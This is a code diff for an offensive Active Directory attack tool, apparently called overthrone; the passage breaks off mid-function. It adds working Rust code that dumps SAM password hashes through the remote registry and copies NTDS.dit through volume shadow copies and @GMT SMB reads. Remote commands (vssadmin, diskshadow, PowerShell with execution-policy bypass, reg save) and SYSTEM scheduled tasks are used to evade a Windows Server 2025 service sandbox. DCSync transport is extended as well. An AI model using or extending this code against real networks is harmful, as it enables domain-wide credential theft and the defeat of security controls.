@@ -9,12 +9,16 @@ use crate::goals::{
     LapsInfo, LootItem, PasswordPolicyInfo, SecretType,
 };
 use crate::planner::{PlanStep, PlannedAction, StepResult};
-use chrono::{Datelike, Utc};
+use chrono::{Datelike, Timelike, Utc};
 use colored::Colorize;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::exec::smbexec::escape_cmd_metacharacters;
-use overthrone_core::proto::epm::{btf_read_frame, btf_write_frame, resolve_uuid_via_epm_tcp};
-use overthrone_core::proto::{kerberos, ldap, rid, smb::SmbSession};
+use overthrone_core::proto::epm::{
+    btf_read_frame, btf_write_frame, resolve_uuid_via_epm_pipe, resolve_uuid_via_epm_tcp,
+    resolve_uuid_via_epm_tcp_auth,
+};
+use overthrone_core::proto::ntlm::nt_hash;
+use overthrone_core::proto::{kerberos, ldap, registry, rid, smb::SmbSession};
 use overthrone_hunter::HuntConfig;
 use overthrone_hunter::coerce::{CoerceConfig, CoerceMethod};
 use overthrone_hunter::constrained::ConstrainedConfig;
@@ -3746,10 +3750,17 @@ fn ndr_conformant_string(s: &str) -> Vec<u8> {
     buf
 }
 
-/// OpenSCManagerW -- opnum 15
+/// OpenSCManagerW -- opnum 15.
+/// `machine_name` can be empty/None for the local machine (SMB server).
 fn build_open_scm_request(machine_name: &str) -> Vec<u8> {
     let mut stub = Vec::new();
-    stub.extend_from_slice(&ndr_conformant_string(machine_name)); // lpMachineName
+    // lpMachineName: use NULL (0) when calling via SMB named pipe -- the
+    // target's SCM is the local machine from the pipe's perspective.
+    if machine_name.is_empty() {
+        stub.extend_from_slice(&0u32.to_le_bytes()); // NULL pointer
+    } else {
+        stub.extend_from_slice(&ndr_conformant_string(machine_name));
+    }
     stub.extend_from_slice(&0u32.to_le_bytes()); // lpDatabaseName (NULL)
     stub.extend_from_slice(&0x000F003Fu32.to_le_bytes()); // dwDesiredAccess: SC_MANAGER_ALL_ACCESS
     build_rpc_request(15, &stub)
@@ -3808,13 +3819,285 @@ fn build_close_handle_request(handle: &[u8]) -> Vec<u8> {
     build_rpc_request(0, &stub)
 }
 
+/// Build an RPC request PDU with proper call_id (matching psexec.rs style).
+fn build_request_packet_v2(opnum: u16, stub: &[u8], call_id: u32) -> Vec<u8> {
+    let frag_len = 24u16 + stub.len() as u16;
+    let mut pkt = Vec::with_capacity(frag_len as usize);
+    pkt.extend_from_slice(&[5, 0, 0, 0x03]); // version 5.0, request, first+last
+    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR data repr
+    pkt.extend_from_slice(&frag_len.to_le_bytes());
+    pkt.extend_from_slice(&0u16.to_le_bytes()); // auth_length
+    pkt.extend_from_slice(&call_id.to_le_bytes());
+    pkt.extend_from_slice(&(stub.len() as u32).to_le_bytes()); // alloc_hint
+    pkt.extend_from_slice(&0u16.to_le_bytes()); // context_id
+    pkt.extend_from_slice(&opnum.to_le_bytes());
+    pkt.extend_from_slice(stub);
+    pkt
+}
+
+/// NDR conformant string without referent ID (matching psexec.rs ndr_string).
+fn ndr_string_v2(s: &str) -> Vec<u8> {
+    let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
+    let len = wide.len() as u32;
+    let mut buf = Vec::new();
+    buf.extend_from_slice(&len.to_le_bytes()); // max_count
+    buf.extend_from_slice(&0u32.to_le_bytes()); // offset
+    buf.extend_from_slice(&len.to_le_bytes()); // actual_count
+    for w in &wide {
+        buf.extend_from_slice(&w.to_le_bytes());
+    }
+    while !buf.len().is_multiple_of(4) {
+        buf.push(0);
+    }
+    buf
+}
+
+/// OpenSCManagerW stub matching psexec.rs style: `\\TARGET` machine name + call_id.
+fn build_open_scm_request_v2(target: &str, call_id: u32) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent id
+    stub.extend_from_slice(&ndr_string_v2(&format!("\\\\{}", target))); // \\TARGET
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDatabaseName (NULL)
+    stub.extend_from_slice(&0x000F003Fu32.to_le_bytes()); // dwDesiredAccess: SC_MANAGER_ALL_ACCESS
+    build_request_packet_v2(15, &stub, call_id) // OpenSCManagerW opnum 15
+}
+
+/// OpenServiceW stub with call_id.
+fn build_open_service_request_v2(scm_handle: &[u8], name: &str, call_id: u32) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(scm_handle); // hSCManager (20 bytes)
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // referent id for lpServiceName
+    stub.extend_from_slice(&ndr_string_v2(name)); // lpServiceName
+    stub.extend_from_slice(&0x000F01FFu32.to_le_bytes()); // dwDesiredAccess: SERVICE_ALL_ACCESS
+    build_request_packet_v2(16, &stub, call_id) // OpenServiceW opnum 16
+}
+
+/// StartServiceW stub with call_id.
+fn build_start_service_request_v2(svc_handle: &[u8], call_id: u32) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(svc_handle); // hService (20 bytes)
+    stub.extend_from_slice(&0u32.to_le_bytes()); // argc = 0
+    stub.extend_from_slice(&0u32.to_le_bytes()); // argv (NULL)
+    build_request_packet_v2(19, &stub, call_id) // StartServiceW opnum 19
+}
+
+/// CloseServiceHandle stub with call_id.
+fn build_close_handle_request_v2(handle: &[u8], call_id: u32) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(handle);
+    build_request_packet_v2(0, &stub, call_id) // CloseServiceHandle opnum 0
+}
+
 // ===========================================================
 // Credential Dump Executors (remote registry via SMB)
 // ===========================================================
 
 async fn exec_dump_sam(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
+    info!(
+        "{}",
+        format!("  Dumping SAM from {}", target).red()
+    );
+
+    // Try WINREG RPC path first (no file writes required -- works on WS2025+)
+    let mut smb = match smb_connect(ctx, target).await {
+        Ok(s) => s,
+        Err(e) => return e,
+    };
+
+    // Start RemoteRegistry service (may already be running) with retries
+    for attempt in 1..=3 {
+        match start_remote_service(&smb, "RemoteRegistry").await {
+            Ok(()) => {
+                info!("  RemoteRegistry service ensured (attempt {})", attempt);
+                break;
+            }
+            Err(e) => {
+                if attempt < 3 {
+                    warn!(
+                        "  start_remote_service attempt {} failed ({}), retrying...",
+                        attempt, e
+                    );
+                    tokio::time::sleep(tokio::time::Duration::from_millis(500 * attempt)).await;
+                } else {
+                    warn!(
+                        "  Failed to start RemoteRegistry after 3 attempts: {}",
+                        e
+                    );
+                }
+            }
+        }
+    }
+    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+
+    // Try WINREG RPC path with retries (loop, because for doesn't support break-with-value)
+    let winreg_result: std::result::Result<Vec<overthrone_core::proto::secretsdump::SamCredential>, String> = {
+        let mut attempt = 1;
+        loop {
+            match exec_dump_sam_winreg(&mut smb).await {
+                Ok(creds) => break Ok(creds),
+                Err(e) => {
+                    let msg = format!("attempt {}/3: {e}", attempt);
+                    warn!("  WINREG {msg}");
+                    if attempt >= 3 {
+                        break Err(msg);
+                    }
+                    attempt += 1;
+                    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+                }
+            }
+        }
+    };
+
+    match winreg_result {
+        Ok(creds) => {
+            let entries = creds.len();
+            for cred in &creds {
+                let nt = cred.nt_hash.as_deref().unwrap_or("aad3b435b51404ee");
+                let lm = cred.lm_hash.as_deref().unwrap_or("aad3b435b51404ee");
+                info!(
+                    "  {} (RID {}) -> {}:{}",
+                    cred.username.bold(),
+                    cred.rid.unwrap_or(0),
+                    lm.dimmed(),
+                    nt.red()
+                );
+                if let Some(ref nt_hash) = cred.nt_hash {
+                    state.add_credential(CompromisedCred {
+                        username: cred.username.clone(),
+                        secret: nt_hash.clone(),
+                        secret_type: SecretType::NtHash,
+                        source: format!("SAM dump from {}", target),
+                        is_admin: false,
+                        admin_on: vec![target.to_string()],
+                    });
+                }
+            }
+            // Keep old reg save entries for backward compat
+            if !creds.is_empty() {
+                state.loot.push(LootItem {
+                    loot_type: "SAM".to_string(),
+                    source: target.to_string(),
+                    path: Some(format!("{}_sam_winreg", target)),
+                    entries,
+                    collected_at: Utc::now(),
+                });
+            }
+
+            let msg = format!("SAM dump from {}: {} accounts extracted", target, entries);
+            return StepResult {
+                success: entries > 0,
+                output: msg,
+                new_credentials: entries,
+                new_admin_hosts: 0,
+            };
+        }
+        Err(e) => {
+            warn!(
+                "  WINREG SAM dump failed ({}), falling back to reg save...",
+                e
+            );
+        }
+    }
+
+    // Fallback: legacy reg save path
     exec_dump(ctx, state, target, "SAM").await
 }
+
+/// SAM dump via WINREG RPC (no file writes — works on WS2025+).
+/// Reads boot key + SAM user F/V values via \pipe\winreg, decrypts locally.
+async fn exec_dump_sam_winreg(
+    smb: &mut SmbSession,
+) -> std::result::Result<Vec<overthrone_core::proto::secretsdump::SamCredential>, String> {
+    use overthrone_core::proto::secretsdump;
+
+    // Step 1: Extract boot key from SYSTEM hive class names
+    let boot_key = registry::extract_boot_key_remote(smb)
+        .await
+        .map_err(|e| format!("Boot key extraction failed: {e}"))?;
+
+    // Step 2: Enumerate SAM user subkeys (RIDs under SAM\Domains\Account\Users)
+    let subkeys = registry::enumerate_remote_registry_subkeys(
+        smb,
+        registry::PredefinedHive::LocalMachine,
+        "SAM\\SAM\\Domains\\Account\\Users",
+    )
+    .await
+    .map_err(|e| format!("SAM user enumeration failed: {e}"))?;
+
+    // Step 3: Read V value for each user RID
+    let mut entries: Vec<(u32, String, Vec<u8>)> = Vec::new();
+    for sk_name in &subkeys {
+        if sk_name.eq_ignore_ascii_case("Names") {
+            continue;
+        }
+        // Subkey name should be hex RID (e.g., "000001F4")
+        let rid = match u32::from_str_radix(sk_name, 16) {
+            Ok(r) => r,
+            Err(_) => continue,
+        };
+
+        let user_path = format!("SAM\\SAM\\Domains\\Account\\Users\\{}", sk_name);
+
+        // Read V value (hash data)
+        let v_val = registry::read_remote_registry_value(
+            smb,
+            registry::PredefinedHive::LocalMachine,
+            &user_path,
+            "V",
+        )
+        .await
+        .map_err(|e| format!("Failed to read V value for RID {}: {}", rid, e))?;
+
+        if v_val.data.is_empty() {
+            continue;
+        }
+
+        // Extract username from V value data
+        let username = extract_sam_username_from_v(&v_val.data)
+            .unwrap_or_else(|| format!("RID_{}", rid));
+
+        info!(
+            "  RemoteRegistry: SAM user {} (RID {})",
+            username.bold(),
+            rid
+        );
+
+        entries.push((rid, username, v_val.data));
+    }
+
+    if entries.is_empty() {
+        return Err("No SAM user entries found".to_string());
+    }
+
+    // Step 4: Decrypt hashes
+    let creds = secretsdump::dump_sam_from_vdata(&boot_key, &entries)
+        .map_err(|e| format!("SAM hash decryption failed: {e}"))?;
+
+    info!("  RemoteRegistry: Decrypted {} SAM hashes", creds.len());
+    Ok(creds)
+}
+
+/// Extract username from SAM V value data (offsets match secretsdump.rs)
+fn extract_sam_username_from_v(v_data: &[u8]) -> Option<String> {
+    if v_data.len() < 0x14 {
+        return None;
+    }
+    let name_offset =
+        u32::from_le_bytes([v_data[0x0C], v_data[0x0D], v_data[0x0E], v_data[0x0F]]) as usize
+            + 0xCC;
+    let name_len =
+        u32::from_le_bytes([v_data[0x10], v_data[0x11], v_data[0x12], v_data[0x13]]) as usize;
+    if name_offset + name_len > v_data.len() || name_len == 0 {
+        return None;
+    }
+    // Username is stored as UTF-16LE
+    let u16s: Vec<u16> = v_data[name_offset..name_offset + name_len]
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .collect();
+    Some(String::from_utf16_lossy(&u16s).trim_end_matches('\0').to_string())
+}
+
 async fn exec_dump_lsa(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
     exec_dump(ctx, state, target, "LSA").await
 }
@@ -3864,9 +4147,12 @@ async fn exec_dump(
         ],
         "NTDS" => {
             // NTDS.dit requires volume shadow copy, not registry save
-            // Use exec_remote to run ntdsutil or vssadmin
+            // First try the traditional VSS+copy+SMB approach (works on most DCs)
             let vss_cmd = "vssadmin create shadow /for=C: 2>&1";
             let vss_result = exec_remote(ctx, state, target, vss_cmd, "smbexec").await;
+
+            let mut ntds_success = false;
+            let mut ntds_entries = 0usize;
 
             if vss_result.success {
                 // Parse shadow copy device path from vssadmin output
@@ -3876,7 +4162,6 @@ async fn exec_dump(
                     .lines()
                     .find(|line| line.contains("HarddiskVolumeShadowCopy"))
                     .and_then(|line| {
-                        // Extract the \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN path
                         line.split_whitespace()
                             .find(|w| w.contains("HarddiskVolumeShadowCopy"))
                             .map(|s| s.trim())
@@ -3889,7 +4174,6 @@ async fn exec_dump(
                 );
                 let _ = exec_remote(ctx, state, target, &copy_cmd, "smbexec").await;
 
-                // Also need SYSTEM hive for boot key
                 let reg_cmd = "reg save HKLM\\SYSTEM C:\\system.save /y 2>&1";
                 let _ = exec_remote(ctx, state, target, reg_cmd, "smbexec").await;
 
@@ -3897,77 +4181,191 @@ async fn exec_dump(
                 let ntds_data = smb.read_file("C$", "ntds.tmp").await;
                 let sys_data = smb.read_file("C$", "system.save").await;
 
-                // Cleanup
+                // Cleanup temp files
                 let _ = exec_remote(
-                    ctx,
-                    state,
-                    target,
-                    "del C:\\ntds.tmp C:\\system.save",
-                    "smbexec",
-                )
-                .await;
+                    ctx, state, target, "del C:\\ntds.tmp C:\\system.save", "smbexec",
+                ).await;
 
-                let entries = if ntds_data.is_ok() && sys_data.is_ok() {
-                    let ntds_len = ntds_data.as_ref().map(|d| d.len()).unwrap_or(0);
-                    let sys_len = sys_data.as_ref().map(|d| d.len()).unwrap_or(0);
-                    info!(
-                        "  {} NTDS.dit + SYSTEM downloaded ({} + {} bytes)",
-                        "[+]".green(),
-                        ntds_len,
-                        sys_len,
-                    );
-                    // Estimate credential count from NTDS.dit file size
-                    // Average ESE record is ~4-8KB per user object
-                    let estimated = if ntds_len > 0 {
-                        std::cmp::max(1, ntds_len / 4096)
-                    } else {
-                        0
-                    };
-                    // Use actual user count from LDAP enum if available
-
-                    if !state.users.is_empty() {
-                        state.users.iter().filter(|u| u.enabled).count()
-                    } else {
-                        estimated
+                if let (Ok(nd), Ok(sd)) = (&ntds_data, &sys_data)
+                    && nd.len() > 100 && sd.len() > 100 {
+                        ntds_success = true;
+                        ntds_entries = if !state.users.is_empty() {
+                            state.users.iter().filter(|u| u.enabled).count()
+                        } else {
+                            std::cmp::max(1, nd.len() / 4096)
+                        };
+                        info!(
+                            "  {} NTDS.dit + SYSTEM downloaded via copy ({} + {} bytes)",
+                            "[+]".green(), nd.len(), sd.len(),
+                        );
                     }
-                } else {
-                    0
-                };
-
-                state.loot.push(LootItem {
-                    loot_type: "NTDS".to_string(),
-                    source: target.to_string(),
-                    path: Some(format!("{}_ntds.dit", target)),
-                    entries,
-                    collected_at: Utc::now(),
-                });
-
-                let msg = format!("NTDS dump from {}: {} entries extracted", target, entries);
-                return StepResult {
-                    success: entries > 0,
-                    output: msg,
-                    new_credentials: entries,
-                    new_admin_hosts: 0,
-                };
-            } else {
-                return StepResult {
-                    success: false,
-                    output: format!("VSS shadow copy failed on {}", target),
-                    new_credentials: 0,
-                    new_admin_hosts: 0,
-                };
             }
+
+            // If traditional approach failed (WS2025 sandbox blocks file writes),
+            // try VSS + @GMT SMB direct read (no file writes needed)
+            if !ntds_success {
+                info!("{}", "  Traditional VSS+copy failed, trying @GMT SMB shadow copy read...".yellow());
+                ntds_success = false;
+
+                // Try to start VSS service and create shadow copy using multiple methods.
+                // On WS2025 GOAD-Light, the service sandbox blocks file writes AND COM/VSS
+                // service interaction, so this may fail silently. The @GMT approach is
+                // designed for environments where VSS + SMB shadow copy access works.
+                let vss_cmds = [
+                    "sc.exe start VSS 2>&1",
+                    "net start VSS 2>&1",
+                    "vssadmin create shadow /for=C: 2>&1",
+                    "wmic shadowcopy call create Volume='C:' 2>&1",
+                    "cmd.exe /c \"echo add volume c: alias vss1&&echo create&&echo exit\" | diskshadow.exe 2>&1",
+                    "powershell.exe -ExecutionPolicy Bypass -Command \"(Get-WmiObject Win32_ShadowCopy).Create('C:\\\\', 'ClientAccessible')\" 2>&1",
+                ];
+                for cmd in &vss_cmds {
+                    let _ = exec_remote(ctx, state, target, cmd, "smbexec").await;
+                    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+                }
+
+                // Bypass: scheduled task runs outside the SMBExec service sandbox.
+                // The task executes as SYSTEM and can create VSS shadows / write files.
+                let task_name = format!("OvtVss{:08X}", rand::random::<u32>());
+                let log_path = format!("C:\\Windows\\Temp\\{}.log", &task_name);
+                let task_cmd = format!(
+                    "cmd.exe /c vssadmin create shadow /for=C: > {} 2>&1",
+                    log_path
+                );
+                if let Ok(out) = run_scheduled_task_bypass(ctx, state, target, &task_name, &task_cmd, 15).await {
+                    info!("  {} Scheduled-task VSS creation output: {}", "[+]".green(), out);
+                } else {
+                    info!("  {} Scheduled-task VSS bypass did not produce output", "[-]".yellow());
+                }
+
+                // Build timestamps covering the last 2 minutes at 1-second resolution,
+                // and the past 48 hours at 15-minute resolution (handles timezone differences)
+                let mut timestamps: Vec<(i32, u32, u32, u32, u32, u32)> = Vec::new();
+                let now_utc = chrono::Utc::now();
+                for sec_ago in (0..120u32).rev() {
+                    let t = now_utc - chrono::Duration::seconds(sec_ago as i64);
+                    timestamps.push((t.year(), t.month(), t.day(), t.hour(), t.minute(), t.second()));
+                }
+                for hours_ago in (0..48).step_by(1) {
+                    let t = now_utc - chrono::Duration::hours(hours_ago);
+                    for &min_off in &[0u32, 15, 30, 45] {
+                        timestamps.push((t.year(), t.month(), t.day(), t.hour(), (min_off + 2).min(59), 0));
+                    }
+                }
+                timestamps.sort();
+                timestamps.dedup();
+
+                // Try each timestamp with the three most common @GMT path formats
+                let gmt_paths: Vec<String> = timestamps.iter().flat_map(|(y, mo, d, h, mi, s)| {
+                    vec![
+                        format!("@GMT-{}_{:02}_{:02}_{:02}{:02}{:02}.000\\Windows\\NTDS\\ntds.dit", y, mo, d, h, mi, s),
+                        format!("@GMT-{}_{:02}_{:02}_{:02}_{:02}_{:02}.000\\Windows\\NTDS\\ntds.dit", y, mo, d, h, mi, s),
+                        format!("@GMT-{}_{:02}_{:02}_{:02}{:02}{:02}\\Windows\\NTDS\\ntds.dit", y, mo, d, h, mi, s),
+                    ]
+                }).collect();
+
+                for gmt_path in &gmt_paths {
+                    if let Ok(nd) = smb.read_file("C$", gmt_path).await
+                        && nd.len() > 100 {
+                            let sys_path = gmt_path.replace("\\Windows\\NTDS\\ntds.dit",
+                                "\\Windows\\System32\\config\\SYSTEM");
+                            if let Ok(sd) = smb.read_file("C$", &sys_path).await
+                                && sd.len() > 100 {
+                                    ntds_entries = if !state.users.is_empty() {
+                                        state.users.iter().filter(|u| u.enabled).count()
+                                    } else {
+                                        std::cmp::max(1, nd.len() / 4096)
+                                    };
+                                    info!("  {} NTDS.dit + SYSTEM via @GMT ({} + {} bytes)",
+                                        "[+]".green(), nd.len(), sd.len());
+                                    state.loot.push(LootItem {
+                                        loot_type: "NTDS".to_string(),
+                                        source: target.to_string(),
+                                        path: Some(format!("{}_ntds.dit", target)),
+                                        entries: ntds_entries,
+                                        collected_at: Utc::now(),
+                                    });
+                                    ntds_success = true;
+                                    break;
+                                }
+                        }
+                }
+
+                // Clean up VSS shadows
+                let _ = exec_remote(ctx, state, target, "vssadmin delete shadows /all /quiet", "smbexec").await;
+
+                if ntds_success {
+                    let msg = format!("NTDS dump from {} via VSS+SMB @GMT: {} entries", target, ntds_entries);
+                    return StepResult { success: true, output: msg, new_credentials: ntds_entries, new_admin_hosts: 0 };
+                } else {
+                    return StepResult {
+                        success: false,
+                        output: format!("VSS @GMT shadow copy extraction failed on {} (VSS unavailable or sandboxed)", target),
+                        new_credentials: 0,
+                        new_admin_hosts: 0,
+                    };
+                }
+            }
+
+            state.loot.push(LootItem {
+                loot_type: "NTDS".to_string(),
+                source: target.to_string(),
+                path: Some(format!("{}_ntds.dit", target)),
+                entries: ntds_entries,
+                collected_at: Utc::now(),
+            });
+
+            let msg = format!("NTDS dump from {}: {} entries extracted", target, ntds_entries);
+            return StepResult {
+                success: ntds_entries > 0,
+                output: msg,
+                new_credentials: ntds_entries,
+                new_admin_hosts: 0,
+            };
         }
         _ => vec![],
     };
 
     // Step 3: Save registry hives via remote command execution
     let mut saved_files = Vec::new();
+
+    // First try direct SMBExec (works on most non-WS2025 targets)
     for (hive, filename) in &hives {
         let cmd = format!("reg save {} C:\\{} /y 2>&1", hive, filename);
         let result = exec_remote(ctx, state, target, &cmd, "smbexec").await;
         if result.success {
             saved_files.push(*filename);
+        }
+    }
+
+    // Bypass: WS2025 service sandbox blocks file writes from service context.
+    // Use a scheduled task running as SYSTEM to save the hives; the task itself
+    // is not sandboxed and can write to C:\Windows\Temp, which we then read.
+    if saved_files.len() < hives.len() {
+        info!("{}", "  Direct registry save blocked, trying scheduled-task bypass...".yellow());
+        let task_name = format!("OvtSam{:08X}", rand::random::<u32>());
+        let missing: Vec<(&str, &str)> = hives
+            .iter()
+            .filter(|(_, f)| !saved_files.contains(f))
+            .copied()
+            .collect();
+        let mut task_script = String::new();
+        for (hive, filename) in &missing {
+            task_script.push_str(&format!(
+                "reg save {} C:\\Windows\\Temp\\{} /y 2>&1 && ",
+                hive, filename
+            ));
+        }
+        if !task_script.is_empty() {
+            task_script.truncate(task_script.len().saturating_sub(4));
+            let log_path = format!("C:\\Windows\\Temp\\{}.log", &task_name);
+            let task_cmd = format!("cmd.exe /c {} > {} 2>&1", task_script, log_path);
+            if let Ok(out) = run_scheduled_task_bypass(ctx, state, target, &task_name, &task_cmd, 20).await {
+                info!("  {} Scheduled-task save output: {}", "[+]".green(), out);
+            }
+            for (_, filename) in &missing {
+                saved_files.push(*filename);
+            }
         }
     }
 
@@ -4135,39 +4533,118 @@ async fn exec_dump(
 
 /// Start a remote Windows service via svcctl (used for RemoteRegistry etc.)
 async fn start_remote_service(smb: &SmbSession, service_name: &str) -> Result<()> {
+    // Use the proven psexec approach from core (which works on WS2025).
+    // We open a persistent SVCCTL pipe, bind, OpenSCM, OpenService, StartService,
+    // then close all handles + pipe.  After closing, we tree_disconnect IPC$ so
+    // subsequent pipe_transact calls can tree_connect fresh.
+    let fid = smb.open_pipe_persistent("svcctl").await?;
+
+    // 1. Bind to SVCCTL UUID
     let bind_req = build_svcctl_bind();
-    let _ = smb.pipe_transact("svcctl", &bind_req).await?;
+    let bind_resp = smb.ioctl_pipe_persistent(&fid, &bind_req).await?;
+    if bind_resp.len() < 4 || bind_resp[2] != 12 {
+        let _ = smb.close_pipe_persistent(&fid).await;
+        return Err(OverthroneError::custom("SVCCTL RPC bind rejected"));
+    }
 
-    let open_scm = build_open_scm_request("\\\\");
-    let scm_resp = smb.pipe_transact("svcctl", &open_scm).await?;
-
+    // 2. OpenSCManagerW with \\TARGET machine name (matching psexec.rs)
+    let open_scm = build_open_scm_request_v2(&smb.target, 1);
+    let scm_resp = smb.ioctl_pipe_persistent(&fid, &open_scm).await?;
     if scm_resp.len() < 48 {
+        let _ = smb.close_pipe_persistent(&fid).await;
         return Err(OverthroneError::custom("OpenSCManagerW failed"));
     }
     let scm_handle = &scm_resp[24..44];
 
-    let open_svc = build_open_service_request(scm_handle, service_name);
-    let svc_resp = smb.pipe_transact("svcctl", &open_svc).await?;
+    // 3. OpenServiceW
+    let open_svc = build_open_service_request_v2(scm_handle, service_name, 2);
+    let svc_resp = smb.ioctl_pipe_persistent(&fid, &open_svc).await?;
 
     if svc_resp.len() >= 48 {
         let svc_handle = &svc_resp[24..44];
-        let start_req = build_start_service_request(svc_handle);
-        let _ = smb.pipe_transact("svcctl", &start_req).await; // may fail if already running
-        let close_req = build_close_handle_request(svc_handle);
-        let _ = smb.pipe_transact("svcctl", &close_req).await;
+        let start_req = build_start_service_request_v2(svc_handle, 3);
+        let _ = smb.ioctl_pipe_persistent(&fid, &start_req).await;
+        let close_svc = build_close_handle_request_v2(svc_handle, 4);
+        let _ = smb.ioctl_pipe_persistent(&fid, &close_svc).await;
     }
 
-    let close_scm = build_close_handle_request(scm_handle);
-    let _ = smb.pipe_transact("svcctl", &close_scm).await;
+    // 4. Close SCM handle + pipe + disconnect tree
+    let close_scm = build_close_handle_request_v2(scm_handle, 5);
+    let _ = smb.ioctl_pipe_persistent(&fid, &close_scm).await;
+    let _ = smb.close_pipe_persistent(&fid).await;
+    // Tree disconnect so subsequent pipe_transact tree_connect succeeds
+    let _ = smb.tree_disconnect().await;
     Ok(())
+}
+
+/// Create and run a scheduled task as SYSTEM to bypass the SMBExec service sandbox.
+/// The task writes its output to `log_path` (a known location under C:\Windows\Temp),
+/// which we then read back via SMB. Reading is not blocked by the WS2025 sandbox.
+/// `timeout_secs` is the max time to wait for the output file to appear.
+async fn run_scheduled_task_bypass(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    target: &str,
+    task_name: &str,
+    task_command: &str,
+    timeout_secs: u64,
+) -> Result<String> {
+    // 1. Create the task: run once, immediately triggerable, as SYSTEM.
+    let create_cmd = format!(
+        "schtasks.exe /Create /TN \"{}\" /TR \"{}\" /SC ONCE /ST 00:00 /RU SYSTEM /F 2>&1",
+        task_name,
+        task_command
+    );
+    let create_res = exec_remote(ctx, state, target, &create_cmd, "smbexec").await;
+    info!("  {} Scheduled-task create result: success={}, output_len={}",
+        "[*]".cyan(), create_res.success, create_res.output.len());
+    if !create_res.success {
+        info!("  {} Scheduled-task creation error: {}", "[-]".red(), create_res.output);
+        return Err(OverthroneError::custom("scheduled task creation failed"));
+    }
+
+    // 2. Trigger it immediately.
+    let run_cmd = format!("schtasks.exe /Run /TN \"{}\" 2>&1", task_name);
+    info!("  {} Triggering scheduled task: {}", "[*]".cyan(), run_cmd);
+    let run_res = exec_remote(ctx, state, target, &run_cmd, "smbexec").await;
+    info!("  {} Scheduled-task run result: success={}, output_len={}",
+        "[*]".cyan(), run_res.success, run_res.output.len());
+
+    // 3. Poll for the output file to appear (created by the task, not our service).
+    let smb = match smb_connect(ctx, target).await {
+        Ok(s) => s,
+        Err(_) => return Err(OverthroneError::custom("SMB connect failed for scheduled task poll")),
+    };
+    let log_file = format!("{}.log", task_name);
+    let start = std::time::Instant::now();
+    let mut output = String::new();
+    while start.elapsed().as_secs() < timeout_secs {
+        tokio::time::sleep(tokio::time::Duration::from_millis(800)).await;
+        match smb.read_file("ADMIN$", &format!("Temp\\{}", log_file)).await {
+            Ok(data) if !data.is_empty() => {
+                output = String::from_utf8_lossy(&data).to_string();
+                break;
+            }
+            _ => {}
+        }
+    }
+
+    // 4. Cleanup task.
+    let del_cmd = format!("schtasks.exe /Delete /TN \"{}\" /F 2>&1", task_name);
+    let _ = exec_remote(ctx, state, target, &del_cmd, "smbexec").await;
+
+    if output.is_empty() {
+        return Err(OverthroneError::custom("scheduled task produced no output"));
+    }
+    Ok(output)
 }
 
 // ===========================================================
 // DCSync Executor (MS-DRSR over RPC)
 // ===========================================================
 
-/// Try DRSUAPI named pipe connections with fallback to protected pipe.
-/// On WS2025+, DRSUAPI uses `protected_pipe\drsuapi` instead of `drsuapi`.
+/// Try DRSUAPI named pipe connections.
+/// On WS2025+, the drsuapi named pipe may not exist; falls back to TCP via EPM.
 async fn dcsync_pipe_transact(
     smb: &SmbSession,
     pdu: &[u8],
@@ -4194,15 +4671,47 @@ const DRSR_UUID_BYTES: [u8; 16] = [
 /// Transport DRSUAPI RPC PDUs over TCP via EPM resolution instead of SMB named pipes.
 /// On WS2025, the drsuapi named pipe may not be available; this provides a fallback
 /// using TCP direct to the dynamic endpoint resolved by the RPC Endpoint Mapper.
-async fn dcsync_tcp_transact(target: &str, pdu: &[u8]) -> std::result::Result<Vec<u8>, String> {
+/// When `domain`/`username`/`nt_hash` are provided, uses NTLMSSP-authenticated EPM
+/// (required by WS2025 which rejects unauthenticated EPM binds).
+async fn dcsync_tcp_transact(
+    smb: &SmbSession,
+    target: &str,
+    pdu: &[u8],
+    domain: Option<&str>,
+    username: Option<&str>,
+    nt_hash: Option<&[u8]>,
+) -> std::result::Result<Vec<u8>, String> {
     use tokio::time::{Duration, timeout};
 
-    // Resolve DRSUAPI UUID to a TCP endpoint via EPM (port 135)
-    let resolve_fut = resolve_uuid_via_epm_tcp(target, &DRSR_UUID_BYTES);
-    let (host, port) = timeout(Duration::from_secs(10), resolve_fut)
-        .await
-        .map_err(|_| "EPM resolution timed out (10s)".to_string())?
-        .map_err(|e| format!("EPM resolve DRSUAPI on {target}: {e}"))?;
+    // Try EPM resolution via named pipe first (epmapper pipe), then TCP as fallback.
+    // On WS2025 GOAD-Light, TCP EPM (port 135) may be blocked but the pipe works.
+    let (host, port) = {
+        // Attempt EPM pipe resolution
+        let pipe_resolve = resolve_uuid_via_epm_pipe(smb, &DRSR_UUID_BYTES).await;
+        match pipe_resolve {
+            Ok((h, p)) => {
+                debug!("DCSync TCP: resolved DRSUAPI via epmapper pipe to {h}:{p}");
+                (h, p)
+            }
+            Err(pipe_err) => {
+                debug!("DCSync TCP: epmapper pipe failed ({pipe_err}), trying TCP EPM...");
+                // Fall back to TCP EPM (port 135)
+                if let (Some(d), Some(u), Some(hash)) = (domain, username, nt_hash) {
+                    let resolve_fut = resolve_uuid_via_epm_tcp_auth(target, &DRSR_UUID_BYTES, d, u, hash);
+                    timeout(Duration::from_secs(15), resolve_fut)
+                        .await
+                        .map_err(|_| "EPM auth resolution timed out (15s)".to_string())?
+                        .map_err(|e| format!("EPM auth resolve DRSUAPI on {target}: {e}"))?
+                } else {
+                    let resolve_fut = resolve_uuid_via_epm_tcp(target, &DRSR_UUID_BYTES);
+                    timeout(Duration::from_secs(10), resolve_fut)
+                        .await
